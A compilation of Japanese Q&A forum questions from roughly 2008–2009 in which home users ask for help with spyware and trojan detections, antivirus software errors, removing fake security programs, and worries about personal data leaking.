私が誰にも言っていないのに都はるみさん関連のサイトや宮崎駿さん関連のサイトを見ていたことを知っていたりする女性がいます。 また私がパソコンの電源を切ると彼女はタイミングよく電話をかけてきたりもします。 ワードパッドをさっき見たら意味不明の文字列が書いてありました。 彼女はプログラマーを目指してC言語などを勉強していたことがあります。 彼女はハッカーなのでしょうか？ また対処の仕方などがありましたら教えてください。 http://detail.chiebukuro.yahoo.co.jp/qa/question …
A-Squared FreeをV4にバージョンアップしてPCをスキャンしたところ、次の２ファイルがTrojanとして検出されました。 1. CravingExplorerフォルダのUnins000.exe 2. Explzh（解凍ツール）フォルダのDECLHA.exe いずれもかなり以前にインストールしたファイルで、A-Squaredの旧バージョンでは引っかかることはありませんでした。 念のため検疫隔離はしてありますが、どうも誤検出ではないかと思えてなりません。それとも、正常なファイルがいつの間にか同名を名乗る偽装マルウェアに乗っ取られたのでしょうか。判断に迷っています。 ちなみに、上記２ファイルをVirusTotalに送って調べたところ、やはりAuthentium, Ikarusその他４～７種類のエンジンがTrojanと判定しました。 同じソフトをお使いの方のご意見をうかがえると幸甚です。OSはXP pro SP3です。なお、セキュリティ・ソフトはほかにNOD32, SUPERAntiSpyware, Comodo Firewall proなど７種類を併用し、Windows Updateも欠かさず実行しています。
HYPERERECTというとこの請求画面がひんぱんに出来てきて困っています。 過去の質問等も見て、わかるものを行ってみたのですが消えません。 わかりやすく教えてください。
　こんにちは。 　 　先日、弟と共有しているパソコンをSpybot-Search ＆Destroyでスパイウェアの検査をしたところ、「Win32.SdBot.add」というものが２つ検出されました。 　私はインターネットは久しぶりの使用でそのようなものに感染する覚えもなく、よく使っている弟も覚えはない、とのことでした。 　 　この「Win32.SdBot.add」はSpybot-Search＆Destroyで消してしまってもよいのでしょうか？ 　 　ご教授ください。よろしくお願いいたします。
お尋ねします。 sdpbot1.6.30 でwindows.explorer検出されました。 内容は以下です。 初心者なので戸惑ってしまいました。 削除してもいいのでしょうか？ よろしくお願いします。 HKEY_USERS\S-1-5-21-3569069952-3075350246-2950969727-1007\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoActiveDesktopChanges
Spyware doctorは毎年自動的に更新されると聞いたので 自動更新されないようにしたいのですが方法がわかりません 手順の記載されているＨＰを検索して手順通りやってみたのですが その時点とＨＰのつくりが変更されているのか 解約ページまでたどり着くことができません もしご存知の方いらっしゃいましたら詳細手順をご教授願います それともカスタマーサービスにメールしないと 解約できないのでしょうか？ よろしくお願いします
Ad-Aware2007をいつも通りに使おうとしたら、以下の文章が出てきて使うことが出来ません。 Unhandled Exception 「aawservice.exe has unfortunately experienced an unhandled exception and was forced to close. Please submit this error and we will endeavor to solve the problem as soon as possible. 」 そしてこれの下にも色々な情報が書いてありますが良く分かりません。 一番下には「Dont send crash report」と「Send crash report to Lavasoft」という選択項目があります。 この警告のようなものはパソコンを起動してからすぐにも出てきます。 原因と解決方法が分からないのですが、どなたか分かる方教えて頂きたいです。
ＵＳＢメモリを挿入すると ウイルスバスター2008が 「不審な変更を拒否しました プログラム　apdproxy.exe C:\Apps・・・　　　　　　」 という表示が出てきて ＰＣがとても重くなり操作ができません アドビーのフォトショップミニに 反応しているようなのですが どのようにしたらいいのか教えて いただけないでしょうか
○○○○○○ パックの中の動画プレーヤーの (1)○○○　プレーヤー とスパイウェア検査だけする（駆除はしない） (2)spy○○○○ ○○○○○○ というソフトウェアは信頼ありますよね？ (1)はプレーヤーがネットに通信するとき個人情報を流出しすぎ？という噂が数年前ありましたんで一応。 (2)はまさか謀国際的有名フリーアンチスパイウェアソフト２個より検出数が多いんですか？ 意味がわかる人お願いします。伏字の内容の質問はご遠慮願います。
私はポートをどのプロセスが使用しているかを http://technet.microsoft.com/ja-jp/sysinternals/ … のTcpViewというフリーソフトで見ていますが（コマンドプロンプトでnetstat.exeをつかっても見られます。）この時ブラウザで閲覧しているwebページと同じIPアドレスに [System Process]:0 というプロセスがアクセスしていますがなぜアクセスしているんですか？ あと[System Process]:0は具体的にどのプログラムファイルなんですか？ あとSystem:4 も具体的にどのプログラムファイルなのか分かりますか？
odbcasvc.exeをウイルスセキュリティが見つけたのですが、駆除できず未処理のままになってしまいます。どうも、トロイの木馬の一種のようですが、どう処理したらよいかわかりません。無知で申し訳ないですが、教えてください。
最近、２ちゃんねるを見るようになったのですが 何度も、「エラー報告を送信する」という表示が出て 検索してみるとスパイウェアが侵入しています。 ２ちゃんねるを見ていると、スパイウェアが侵入してくることは 普通のことなのでしょうか。 それと、２ちゃんねるを見ていて「エラー報告を送信する」という 表示が出て、検索をしてみても何も発見されないこともあります。 IPが抜かれているということでしょうか。
トラックバックにエッチな記事が入りました。削除するにはどうしたらよいか、教えてください。
エラータイプ：Unable to send the Request to server(-3) 旧ウイルスセキュティーをアンインスト－ルして新しいＣＤ－Ｒ版ウイルスセキュティーＺＥＲＯを購入して登録しようと接続しましたが登録できません。エラーコメント『エラータイプ：Unable to send the Request to server(-3)』出ますので対応よろしくお願いします。
源氏物語夕顔編というフリーで、広告が表示されるのタイピングソフト をインストールすると、 「実行時エラー’429’: ActiveXコンポーネントはオブジェクトを作成できません。」 というエラーが表示されるようになり、 ソフトをアンインストールしたのですが、 Windows XPの起動時に必ず このメッセージが出るようになってしまっています。 インストールしたタイピングソフトはコチラです↓ http://www.vector.co.jp/soft/win95/edu/se448263. … 調べたところ、ランタイムという実行環境が無くなってしまったようなのですが、どうやって修正すれば良いかわからず、 このメッセージを消す方法をご存じでしたら教えてください！ エラーメッセージを添付致します。
Spybotを実行したら Spaybot-Search&Destroyは重要なレジストリの変更を検知しました カテゴリ　Internet Explorer Searches 変更　　　Value削除 変更許可する　　　変更遮断　　 という画面が表示されました。許可していいものやら 変更遮断したらいいのか意味がわかりません。 ネットで調べてもわからないのですが、意味と選択について どなたか教えていただけないでしょうか
こんにちは！ SUPERAntiSpywareを使用しています。 全ての作業が終わると「完了」ボタンが下に出ますが、 英語ではscan and removal complete と出て、「back to main page」が出ますね。 その後、Manage Quarantineをクリックして、quarantineしたspywareをremoveする必要が在りますか？ quarantineのコンピューター用語としての意味が、どうも良く分かりません。 XP SP-3 PENTIUM IV　 ご教示下さい。 よろしくおねがいします。
Ad-Aware 2008 Freeをセーフモードで立ち上げると エラーになりますがどうすれば正常に出来ますか？ ノートパソコン2台(OS:XPとWIN2K 双方とも無線LAN使用)とも 通常モードでは問題なく起動しますが セーフモードでは下記のエラーメッセージが出ます。 何度となくインストールのやり直しも しましたがセーフモードではエラーになります。 Application Error Exception EAccess Violation in module Ad-Aware.exe at 001DA25C. Access Violation at address 005DA25C in module 'Ad-Aware.exe.' Read of address 00000418 セーフモードで起動させたいのですがどうすればいいでしょうか？ どうかよろしくお願いします。
ウイルスバスターのような、個人情報を予め登録しておいて、それが外部に送信されるときに警告を出すと言うソフトはありますか？ 教えてください。
某掲示板にてよく画像を添付するのですが、その画像にブロックをかけて、コピー（右クリックによる保存、ダウンロードによる取得）を防ぐ方法はありますか？ そういったソフトがありますでしょうか？ もしくは、ファイルデータ（データ名）になんらかのキャップをつけることでできますでしょうか？ ソフトの場合は有料・無料は問いません。 当方パソコン初心者のため、できるだけわかりやすく、極力専門用語抜きでのご説明を頂ければ幸いです。 よろしくお願いします。
当方はパソコンに関して初心者です。 重複する質問が過去にあれば、お許しください。 セキュリティ検索でスパイウェアが検出されました。すぐに自動的に削除しましたが、以下の二点についてお教えください。 (1)スパイウェアに侵入されたら、パソコン内に保存しているワードやエクセルで作成している家計簿や家の重要な保存ファイルがすべて他人に盗み見されるのですか。 (2)例えば１２月１日にスパイウェアに感染し、２日に削除した場合、１日間で保存ファイル全てが盗まれるのですか。 なお、当方はNTTフレッツ光でインターネットをしており、ウイルスやスパイウェア対策は良好に機能していますが、検索は手動で行なわなければならず、毎日検索しても、感染してから削除まで少なくとも数時間要すると思います。 よろしくお願いします。
【F-Secure オンラインスキャナ】でスキャンが出来ません。 http://www.f-secure.co.jp/v-descs/disinfestation … 注意事項 1.クライアントPC 上でウィルス対策ソフトのリアルタイム保護を有効にしている場合、リアルタイム保護が指定したファイルへのアクセスを阻害するため、ウィルスを 検出しません。リアルタイム保護を一旦無効にして検査する必要があります。 2.オンラインスキャナは、プロキシ環境では利用することができません。 3.オンラインスキャナは、ActiveX を利用します。動作しない場合、インターネット・エクスプローラを以下のように設定してください。 「ツール」→「インターネッ トオプション」→「セキュリティ」タブを選択→「レベルのカスタマイズ」を選択→「署名済みActiveX コントロールのダウンロード」を「ダイアログを表示する」に設定 現在、ウィルスバスター2009（IE7、Windows Vista）を使用しています。 ウィルスバスターでは検出できない？スパイウェアに感染した恐れがあるため、上記オンラインスキャンを試みたのですが上手くいきません。 ダウンロードは完了したような感じなのですが、タスクトレイなどに変化もなく・・・ スキャン画面も5分以上動かないままだったので、そのまま中止してしまいました。 「注意事項」の「2」は意味がわかりません。 「1」はウィルスバスターを停止させて実行→失敗、「3」→失敗しました。 どなたか助けてください！よろしくお願いします。
いろいろあるとは思うのですが、 SUPERANtiSpywareとa-squaredはどう違うのでしょうか？ 有料だと常駐してくれるみたいですが、導入されてる方はどうでしょうか。 有料購入してもメリットありますでしょうか。 （当方１２時間以上毎日接続してるため） その場合どちらがいいでしょうか。アドバイスあればお願いします。 できましたらクッキー検出、マルウエア検出がいいです。 よろしくお願いします。
数日前からPCを立ち上げると真っ黒のウインドウが数個出てきてウイルス対策ソフトが働き「ウイルスを隔離したので安心です」とメッセージが出ます。ウイルス対策ソフト（ソースネクストのウイルスセキュリティー）を使ってPC全体の検査をし、きれいな状態にしてからも症状は続いています。システムの復元をしようかとも思いましたが、システムの復元をするとウイルス対策ソフトが無効になり再インンストールが必要になってしまいます。復元で直らなければ、ウイルス対策ソフトが無効な状態で大変なことになるのではないかと思い、出来ません。どうしたら直るのでしょうか？何かの都合でウイルス対策ソフトが使えなくなったらと考えると怖いです。 ちなみに隔離されたウイルスの情報としては・・・ ファイル名　　ftpdll.dll 隔離前の場所　　C:\Documents and Setting\LocalService 説明　　Trojan.Win32.Pakes.cjz とあります。どなたか助けてください。よろしくお願いします。
Spybot1.6の免疫でhostsファイルに危険リストを登録するようにしてるんですが、そのリストに任意のホスト名を追加したい場合はどういうふうに書けばいいんでしょうか？ テキストエディタで開くと、hostsファイルの中身が # Start of entries inserted by Spybot - Search & Destroy （この部分に危険ドメインのリスト） # This list is Copyright 2000-2008 Safer Networking Limited # End of entries inserted by Spybot - Search & Destroy このようになっています。 そこで自分でこれらの前後に追加してみましたが、その後に再度Spybotの免疫化を使用すると変な文字化けが現れたりしておかしくなってしまいました。 Spybotによるhostsファイル免疫も利用しつつ、自分でホスト名を追加して書く方法を教えてください。よろしくお願いします。
このカテゴリーで違っていたら ごめんなさい。 PCの事ほとんと解らない初心者です。 昨晩、スパイウェア対策が自分でも出来る 無料での記述を見て自分でいじっていましたら インターネット.エキスフローラ７？というのが 出てきてOKクリックしましたら、 デスクトップ上のアイコンが今までと変わり ました。 そして、、教えてgooの文字が極端に小さくなり とても読みづらく困っております。 どの様に致しましたら前のようになりますか ご教示頂けましたらとお願いいたします。
お世話になっています。 昨日、Antivirus2009に感染しました。教えてgooやネットを参考に駆除を試みているのですが、駆除ソフトがダウンロードできません。 SUPERAntiSpyware Free Edition、Malwarebytes' Anti-Malwareを試してみましたがどちらもダウンロードできませんでした。 今まで行ったことは ・誤ってav2009をダウンロード ・すべてのプログラム、デスクトップ上のav2009を削除、ごみ箱からも削除 ・maconfigにあるav2009のチェックボックスを外し、再起動 そこで駆除ソフトをダウンロードしようと思い、gooで挙げられていたものをダウンロードしてみたのですが、ブラウザに表示できませんという画面になります（数個ためしました） 別ノートパソコンからUSBにダウンロード、感染したパソコンに移してみたのですが、インストールしようとするとエラー（問題が発生したため終了します）がでます。別ノートにはインストールできます。 また、ネットワークが保護されているのかと思い、ネットワーク接続から「インターネットからのこのコンピュータへのアクセスを制限したり防いだりして、コンピュータとネットワークを保護する」を一時無効にしましたができませんでした。 どうすれば駆除ソフトがダウンロードできるでしょうか？ また他の対処法があれば教えてください。
spypodをインストールスキャンした所 製品:CnsMin 驚異:Trojan というスパイウェアが検出されました。 問題箇所を修正／削除のボタンを押して削除を試みたのですが、英文の警告の後にエラーが出てアクセス拒否され削除が出来ない状態です。 こういった場合はどう対処すれば良いのでしょうか？ セーフモードでファイルを削除すれば良いのでしょうか。 詳しい方アドバイスをお願いします。
クッキーマネージャーというソフトを使ってます。 あるサイトにログインの再IDごとにIPアドレスを変更しているのですが、 前から気になっていたことがありまして、 そのクッキーマネージャーを見て、クッキーを見ると なんとクッキーの先頭に当方のPCの名前がついているのです（OSはXP） これってもしかしてIPアドレスを変更しても意味ないでしょうか？ 毎回クッキーを全部消して　ブラウザを閉じ、IPアドレスを変更して 別のIDで再ログインしてます・・。 それと毎回送信されるクッキーもほとんど一緒なんです。 番号位しかかわらないようで・・・。
お世話になります。 Ad-awareのフルスキャンを行うと必ず途中で止まってしまいます。 過去の質問/回答などから下記のことは実施してみました。 (1)1日以上放置。(２日経っても完了しませんでした。） (2)セーフモードで起動 (3)チェックディスク (4)デフラグ (5)レジストリのチェック (6)ファイルを削除し、HDの空きを増やす 止まるところはSection：Deep scanning registryです。 スマートスキャンは問題なく出来ます。 Ad-awareのバージョンは2008です。 以上ですが、解決方法をご存知の方おられましたらご教授お願います。
最近なにやら怪しいサイトに入ってしまい、今パソコンをつけてみるとウイルス対策ソフトが「トロイの木馬を検出しました」と出てきました。 おそらくIPアドレスが抜かれたのだと思います。 どうすればいいのでしょうか？今とても困っています。
あまりよろしくないサイトから拡張子「mpeg.exe」がついたファイルをダウンロードし実行しました。再起動後「XLgurder」というのが作動し、デスクトップのアイコンが表示されません。どうしたらよいのでしょうか？かなりこまっています。 タスクマネジャーで「XLgurder」は止めることはできたのですが、画面が真っ白です。
おはようございます。 『ウイルスバスター』を単体で使うのと、 ウイルス対策に『AntiVir』（または『AVG』）　＋　ファイアウォールに『ZoneAlarm』を使うのでは、 どちらの性能が上でしょうか？　どちらが安全ですか？ よろしくお願いいたします。
私はスパイスウィーパーを使っているのですが、パソコンを使っているとときどき（定期的にかもしれませんが）「spy sweeperはスパイウェア定義の更新を完了しました。これで、173,617の脅威から保護されます。」というのが画面右下に出てきます。 この“173,617”という数字は一体何のことなんでしょうか。 パソコンに詳しくないため何を表わしているのか全くわからず、気になっているので教えてください。
winweb security というスパイウェアに愚かにもひっかかってしまいました。除去しようとMalwarebytes' Anti-Malware を実行しましたが駄目でした。winweb securityについて検索しても日本語のHPが見つからないのですが新種のスパイウェアなのでしょうか？ 対策方法を教えていただけませんか
PCがどうやらスパイウェアに感染しているようなのです。 良くフリーズするし、勝手に変な「広告ウィンドウ」が開くし、 「ファイルをダウンロードしています」とか「メンバーがチャットした がっています」とかっていうメッセージが表示されます。 ウィルスバスターでチェックすると、毎回、ウィルスやスパイウェア が引っかかるので、駆除してもキリがありません。 http://wiredvision.jp/archives/200405/2004051305 … ↑ここで読んだら、パソコンの症状が一緒だし、 「ユーザーがプログラムを削除しても、まるでガン細胞のように自分を 何度でも複製して復活する」 ・・・とあるので、どうすれば良いのでしょうか？！ 修理に出すしかないでしょうか？ それとも、「初期化」すれば直るでしょうか？
下記、条件にあう、お薦めの対策方法を教えてください。 １）社員数5名の事務所です。 ２）既存のネットワークは、機器～構築含め、利用しているIP電話事業者に現状、お願いしています。(但し、対応がよくありません。。) ３）パソコンはWinXPが2台・WinVistaが1台です。（ほかにモノクロ複合機とインクジェットプリンタが3台あります。） ４）掲題の対策を施そうとしているきっかけは、メインのPCに年明け、基幹系のシステムを導入する予定があるからです。 　※とはいっても、FileMakerProのサーバー版とクライアント版を各パソコンにインストールし、クライアント版にて、更新したデータ等をサーバー版に更新・蓄積させていくようなイメージです。 ５）一応、ファイアウォールの導入を検討しているのですが、２）の業者にお願いするのは、極力、避けたい状況で、他社で、長年相談にのってもらっている、詳しい人にも相談しているのですが、既存の業者の「ルータの設定等はいじれないかもしれない。」という話を伺っています。 ６）一応、各パソコンには、インターネットセキュリティV3というセキュリティウェアはインストールしてあります。 若干、難解な相談かもしれませんが、アドバイス宜しくお願いします。
昨日の夜、ブログめぐりをしていたところ、突然「Thatsping.com」 という海外のサイトが表示されました。 戻るをクリックしてもまたそのサイトが表示されました。 一度ネット接続を切断してもう一度接続したところ、 サイトは表示されませんでした。 その日は念のためCookie・一時ファイル・履歴を削除して 終了しました。 そして翌日の今日、ネットサーフィンをしていたところ、 また同じサイトが表示されてしまいました。 少し検索してみたところ、まずはシステムの復元を した方がいいとのことだったので、五日前の時点まで システムを復元しました。 たぶんスパイウェアの仕業ではないかと思いますが、 初心者のためこれ以上の対応が分からず、個人情報が漏れて しまわないか心配です。 今後の対応について教えていただきたいと思います。 ちなみにウイルス対策ソフトはウイルスバスター2006を使用しています。 使用期限は2010年の5月となっています。 スパイウェア対策ソフト等は入っていません。 よろしくお願い致します。
もし、パソコンがウィルス等に感染していたら、気づけるものでしょうか？セキュリティはキングソフトのものを使っていて、特に何も感染はしていなさそうなので、まず大丈夫だとは思うのですが、もし、ウィルス等に感染してしまったとしたら、症状として何か異常がでたり、感染した事にはっきりと気付けるものでしょうか？？パソコンには一応住所録とか入っていて、もしかして情報流出とかになったら困るなぁと思って。。。普通に使っていて、もし情報流出するようなものに感染したとしたら、気付ければまぁ対処すればいいかなと思うのですが、実は感染していた、流出していたとなったらまずいですよね。。詳しい方お願いします。ちなみに情報流出というのは何を介して流出するのでしょうか？winnyとかを起動していなかったら流出したりはしないのでしょうか？それとも何かをきっかけに感染したとしたら、いつでも、流出するものなのでしょうか？ よろしくお願いします。
パソコンを起動すると、韓国語なのか英語なのかよくわからない、 会話のような映画予告のような会話が数回ほど繰り返し流れます。 スパイウェアかと思って、Ad-Awareとspy-botでフルスキャンしてみたのですが、 改善はしませんでした。 何をしていてこれの原因を入れてしまったのかよくわからないのですが、 直す方法はないでしょうか？
初心者なのでよろしくお願いします。 これまでIE７でウィルスバスター２００９を使っていていまして、キー入力暗号化を使っていたのですが、今回FireFoxに変えたところキー入力暗号化ができなくなりました。トレンドマイクロを確認したら、Firefoxではキー入力暗号化はサポートされていないとのことですが、FireFoｘでもキー入力暗号化をするには、どのようにしたらよいでしょうか？暗号化のソフトを別に入れなければならないでしょうか？フリーソフトで良いものがあれば教えてください。フリーソフトを入れた場合、IE7では使えるキー入力暗号化と併用可能（何かおかしくなったりしない）でしょうか？ これからもIE7も併用して使って行く予定ですのでパスワード入れるものはIE7を使うというのでも良いのですが、家族も使うのでどれでも安心なようにしておきたいと思っていますので、よろしくお願いします。
一昨日まで普通に入れていた、自分のサイトに設置しているFC2ブログの管理人画面に、昨日から突然、アクセす出来なくなりました。 いつものログインページを開いても、 -------------------------------------------------- 「トレンドマイクロ」webサイトへのアクセスをブロックしました 有害サイトの可能性があります。安全のため、このwebサイトへのアクセスをブロックしました。 信頼性: 警告 このWebサイトにアクセスしても問題ない場合は、次の手順に従ってください。 １．Windowsのスタートボタンをクリックし、[すべてのプログラム] からウイルスバスター2008 (メイン画面) を起動します。 ２．[フィッシング詐欺対策/迷惑メール対策] をクリックします。 ３．[フィッシング詐欺対策] の [設定] をクリックします。 ４．パスワード入力が要求された場合は、パスワードを入力します。 ５．[許可するWebサイト] をクリックし、Webサイトのアドレス (上記を参照) をリストに追加します。 -------------------------------------------------- こういうページが表示されてしまいます。 この文章にしたがって、ウイルスバスターを開き、フィッシング詐欺対策の設定から、このページのアドレスを入力し、ブラウザの再起動を…とあったので、全てのブラウザを閉じて、再度開いてみたのですが、何度やっても上記のページが表示されるばかりで、一向に普段のログインページが表示されません… ログインページは表示されませんが、自分のブログは普通に閲覧できます。 このままだと、ブログの更新が出来なくて大変困っております。 この場合、考えられる理由は何かあるのでしょうか？ やり方が間違えてるのか、何がおかしいのか、わからず困り果てております。 ご存知の方、教えていただけないでしょうか。 使用しているウイルスソフトは、ウイルスバスター2008です。
ウイルスバスターでウイルスを検知し、自動で隔離になりました。 隔離したファイルは「C:\WINDOWS\BHOZU.dll」です。 隔離してから、起動するたびに 「C:\WINDOWS\BHOZU.dllが見つかりません」とRUNDLLの読み込みエラーが出てしまいます。 現在のところ、普通には動いてますが、起動のたびに表示されてしまい、気になっています。 隔離を解除すると、表示はありませんが、ウイルスバスターが反応してしまいます。 後から入れたアプリケーションに必要なファイルなのでしょうか それともOSに必要なファイルなのでしょうか 何か解決方法がありましたら、ご教授お願いします。
先日、ミニPCを購入しました。その際、このPCはネットショッピングを中心に使うのでウィルスソフトはセキュリティーが強い方が良いと思い、ノートンインターネットセキュリティー2009を買いました。 ところが、いつも使っている買い物サイトに入り、IDとパスワードを入力したところ、IDとパスワードを受け付けません。そのサイトに問題があるのかと思い、今まで使っていた別のPCで入ってみたところ、問題ありませんでした。因みに今まで使っていたPCのウィルスソフトはウィルスバスター2009です。 ノートンの設定に問題があるのでしょうか。もしご存知の方がいましたら、教えて頂けますでしょうか？宜しくお願いします。
トロイの木馬に感染したとのメッセージが表れました。 「修復するには再起動を」 とのことで再起動しました。 今、総合検索のツールを見ています。 ウイルス1件スパイウェア13件です。 そこで、「以下の処理を行いました」と 実行した処理「ウイルス隔離」です。 この「隔離」の意味がわかりません。 どうすればいいのでしょうか。 処理されたから、このまま「閉じる」ですか!? 初めてのことでパニくってます・・・ 息子が変なサイトみたんでしょう。 先日ブラクラとゆう状態が現れたみたいです。 教えてください。
以前から気になっていたのですが、調べてもわからないので質問です。 ネット回線に常時接続している状態で、 PCの電源ON ＞ BIOS起動 ＞ OSの起動作業 の間は、ハッキング等の外部からの攻撃は可能なんでしょうか？ DOSベースの作業（スキャンディスク、マザーボードのBIOS更新）を している時にふと思って、それからずっと気になってます。 ご存知の方いましたらよろしくお願いします。
初めまして。 カテ違いかもしれませんが教えて下さい。 違うポータルサイトに違うブログをそれぞれ開設していて ひとつは全然更新していないのですが、 もうひとつはマメでは無いですが、出来るときは更新しています。 ここ最近全く同じ内容のスパムコメントがそれぞれのブログに つけられてしまうのですが、 このようなことってあるのでしょうか？ なんだか気味悪く内容もスパム内容で不快なので とりあえずマメに確認して消すくらいしか出来無いのですが・・・ 対処法と原因等わかりましたら アドバイス願います。 またＰＣのウィルス対策としては キングソフトをダウンロードしています。 甘いでしょうか・・・。
Spybod　S&D　1.5.2を使用しているのですが。 最近スキャンの時間がとても長く2時間ぐらいになるのですが これが普通なのでしょうか？ よろしくお願いします。
僕は今Yahoo!メールを使っています。 そして、もしパソコンがウイルスにかかっているとします。 そして、勝手に、Yahoo!メールでログインされて、ＳＤカードにある、写真や動画が添付されて勝手に送られることはありえますか？ そして、ＳＤカード内で削除した画像や動画も勝手に送られることはありますか？ さすがに削除した画像や動画はありえませんよね？
http://www.trendmicro.co.jp/vinfo/virusencyclo/d … ここに書いてある方法での削除に望みましたが、ワームソフトのbackdoor系列のrejoice101.exeとそのAutorunが何度やっても復活してしまいます。 内臓HDDへの検索で rejoice をキーワードに残りカスが無いか調べたり、レジストリの方も rejoice で検索をかけて残っているものが無いように、ということをやりました。 rejoiceはどうやら性質としてすべての物理ドライブ及びリムーバブルドライブ内に自動的にコピーを作るようなので、削除し切れたかな？と思うたびに、外付けHDDの再起動をしてみて、rejoiceが復活しているのを確認していました。 表面に現れる症状で困っていた、ダブルクリックでHDDが開けなくなるという現象は治ったのですが、このワームをもった外付けHDDを他の人のPCにつなぐことで感染させてしまうだろうということで困っております。 rejoice101.exeの完璧な消し方について、お分かりになる方がいらっしゃっいましたらその方法の指導をお願いいたします。
WindowsXP上でOutlook２０００というメーラを使用しています。 迷惑メールがたくさんくるので、迷惑メールフィルタをメーラに追加しようと思うのですが、Outlook２０００に迷惑メールフィルター機能を追加するソフトで性能がいい、またはメジャーなのはどのソフトでしょうか？ できるだけフリーソフトがいいです。 Thunderbirdも使用していますので、Thunderbird用も教えていただければありがたいです。
gooの今日の質問ダイジェスト版１１月１２日分の、ウイルス対策の質問の欄をみていたのですが、トロイの木馬に感染したかもしれません。 今日の質問ダイジェスト版、１２日分の、ウィルス対策のコーナーの、「Virtumondeらしきモノに感染したようです」（質問番号４４７０７４８）の質問を読もうとして、クリックしたら、教えてgoo!のコーナーじゃなく、ダウンロードっぽい画面が一瞬でたかと思ったら、マカフィーの警告画面にかわり、「トロイの木馬は隔離しました、復元のファィルの所に・・」と出ました。 ウィルススキャンを一度してから、セキュリティセンターの復元のファイルのコーナーを開け、 「このウィルス情報をマカフィー研究所に送信してください、」のボタンをクリックして送信してから、削除しました。念のため、その後２回全スキャンしました。スキャンしてウィルスは一つも検出されていません。 「トロイの木馬を隔離しています」の画面が初めに出てからも、ずっとセキュリティーセンターの画面では、青色の「このパソコンは保護されています」マークが出ています・・多分大丈夫だとは、思うのですが、・・（やはり、少しは、不安ですが・・怖い、） マカフィーのサポートセンターに、先ほど電話をして（一発でつながりました！）オペレーターの方に伺ったら、大丈夫とのことで、一応は安心しているのですが、（感染前に隔離できている、とのことです） マカフィーのウイルス情報で調べたら、このスパイウエアはトロイの木馬型で、マカフィーではJS/FakeAlert-AB,dldrという、名前だそうです。 私は、本当にパソコン初心者なので、マカフィーに入ってなかったら、どうなっていたか、と思います、年間４，０９０円の一番安い分（ウィルススキャンとファィヤーウォール、なのに、ありがとうMaCafee！、）感謝しています、 私みたいな、パソコン初心者でない皆さんは、こんなの引っかからないと思いますが、１２日のダイジェスト版でこの質問のタイトル欄はクリックされないほうがいいと、見ようとされない方が、良いと思います、 （今、もう一度確かめたら他の質問タイトルは、oshiete1. goo・・と、リンクが一行になっているのに、この質問だけ２行になってる。osiete1.gooのところをクリックしたつもりが、上の行も一緒にクリックしたのかと思います、）
カスペルスキーの体験版とspybotの無料版を入れていたのに 念の為マイクロトレンドのオンラインスキャンをしてみた所 アドウェアが検知されてしまいました。 あせって名前を見る前に削除してい、 情報がまったく無いので申し訳ないのですが、 この場合やばいアドウェアかわかる方いらっしゃいますでしょうか？ あと、削除すると重くなるアドウェアがあるというのは本当なのでしょうか？ カスペルスキーやspybotを使っても残るようなモノなので重要なものなのかなと気になります。 もう一つ パソコンに入っているテレビのpowerutility schedule pusucap.exeというプログラムで キーロガーというプログラムを検知しました、終了できませんでした、検知しました、というメッセージが続くのですが これって感染しているという事なんでしょうか？ 質問になっていない質問なんですが不安で、 答えて頂けたら助かります。
ウィルススキャンの期限が切れたので、CAお試し版をダウンロードしました。 検出されたスパイウェア一覧には左から、 ＜スパイウェア・脅威レベル・分類・提案＞とあります。 一覧で上がったファイルのほとんどが、 「提案：削除または無視」なのに、 ２つだけ、「提案：削除」となっています。 ＜Dowritn AF・低から高・トロイの木馬・削除＞ ＜Puzzles Master・中・ダウンローダ・削除＞ トロイの木馬は聞いたことのある名で、有害なのでは？と不安です。 しかし消したらPCに支障がでるソフトかも？とこっちでも不安です。 指示に従って消すべきでしょうか？ 教えて下さい。
LimeWireで不注意によりAdzgalore Games Collectionなる物をインストールしてしまいました それ以降、GoogleやYahoo！、Wikipediaで検索をかける度に 画面の左側にsponsored Linksと表示され下には海外サイトへのリンクが貼られるようになってしまいました アドウェアの一種でしょうか？ 消したくて、X-CleanerとAd-Watchを試してみましたが無理でした。 X-Cleanerのデラックス版を買うしかないのでしょうか？ ちなみに画像です http://www.odnir.com/cgi/src/nup26715.png
URIに飛ばされ英語のダイアログが表示されるウィルスのようなものに感染してしまいました。 ・ノートン2009の最新版で完全スキャンしても、感染は検出されません。 ・sptbotで検索すると「Virtumonde」が検出され、対策(削除)してもする復活します。 ・IEを開いたり、windowsを起動することが、トリガーのようで、普段Firefoxを使用しているのであまり発症しません。 ・「Virtumonde」関係の削除ツールを少し試してみましたが削除できませんでした。 OSの再インストールが必要でしょうか? [環境] ・windowsXP Profetional Ver 5.1.2600 SP3 ・firefox3.0.3 ・IE 7.0.5730.13 [spybotの検索結果] Virtumonde: [SBI $779C9C0D] 設定 (レジストリキー　, nothing done)　HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\RemoveRP Virtumonde: [SBI $FD08B4B7] Configuration file (ファイル, nothing done) C:\WINDOWS\system32\kmTELkkj.ini2 Virtumonde: [SBI $2A2DCEAC] Configuration file (ファイル, nothing done) C:\WINDOWS\system32\kmTELkkj.ini
例えばＮＴＴのホストコンピューターにサーバーをいくつも経由して不正アクセスしたとしたらその人物は特定され捕まえることはできるでしょうか？ もちろんそう簡単に忍び込むことはできないでしょうが個人情報とか盗まれたら犯人は捕まりますよね？
パブリックの掲示板に匿名で記載された内容がどのPC（PCのIPアドレスから記載されたか特定できますか？ 悪質な書き込みをした人を警察が書き込みからIPアドレスを特定しているようですが、どのような技術を使っているのでしょうか？
2005年に購入した新品パソコンをリカバリしました、下記のソフトが入っています。 1.McAfee Personal Firewall Plus 2.McAfee SecurityCenter 3.McAfee VirusScan こういったソフト2005年の時に、90日無料体験版を使ったことがあります、その後は購入していません。今回のリカバリ後、また90日無料体験版ができれば使ってみたいと思って、アカウント登録までは行きましたが、結局体験版も購入しなければいけない、無償使用はできない結果になりました。こうなると、今後もう使わないから、完全にアンインストールしたいです。 コントロールパネル→アプリケーションの追加と削除を開いて、上記三つを見つかりました。 とりあえず、2のMcAfee　SecurityCenterの後ろの削除ボタンを押してみた、下記画面が出て来ます。待っていても、この画面がずっとそのまま動かないです。線の上下の文言が矛盾しているようで、いくら読んでもわかりません： McAfeeアンインスト-ラ：McAfee SecurityCenter McAfee SecurityCenterをアンインストールしています。 McAfee SecurityCenterのコンポーネントがアンインストールされるまでお待ちください。 ------------------------------------------------ McAfee SecurityCenterをアンインストールするには、先にすべてのMcAfeeサービスをアンインストールする必要があります。 再起動ボタン(灰色)　閉じるボタン(クリックできる) 「先にすべてのMcAfeeサービスをアンインストール」とはどういう意味ですか？ 